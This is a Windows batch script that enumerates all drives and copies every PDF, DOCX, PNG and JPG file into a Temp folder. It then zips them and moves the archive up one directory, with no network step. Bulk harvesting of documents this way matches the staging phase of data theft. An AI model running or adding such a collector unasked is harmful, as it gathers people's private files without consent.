@echo off
setlocal enabledelayedexpansion


set targetDir=C:\Windows\Temp\collected_files
set zipFile=C:\Windows\Temp\collected_files.zip
set fileCount=0
set count=0



for /f "tokens=1 delims=" %%d in ('wmic logicaldisk get caption ^| find ":"') do (
    echo Found drive: %%d
    set "drive[!count!]=%%d"
    set /a count+=1
)

if not exist "%targetDir%" (
    mkdir "%targetDir%"
)


echo Clearing old files in the target folder...
del /q /f "%targetDir%\*.*" >nul 2>&1


for /L %%i in (0,1,%count%-1) do (
    set "currentDrive=!drive[%%i]!"
    echo Processing drive !currentDrive!


    call :processDrive !currentDrive!
)


if %fileCount% gtr 0 (
    echo %fileCount% files have been copied to %targetDir%. 
    echo Starting file compression, please wait...
) else (
    echo No matching files found.
    goto :eof
)


if exist "%zipFile%" (
    echo Found old zip file, deleting it...
    del /q /f "%zipFile%"
)


powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%targetDir%', '%zipFile%')"


if exist "%zipFile%" (
    echo Files have been compressed to %zipFile%. 
    move %zipFile% ..
) else (
    echo Compression failed.
)

pause
goto :eof

:processDrive
set "drivePath=%1"
for /r "%drivePath%\" %%f in (*.pdf *.docx *.png *.jpg) do (
    @REM echo Found file: %%f
    copy "%%f" "%targetDir%" >nul 2>&1
    if not errorlevel 1 (
        set /a fileCount+=1
    )
)
goto :eof
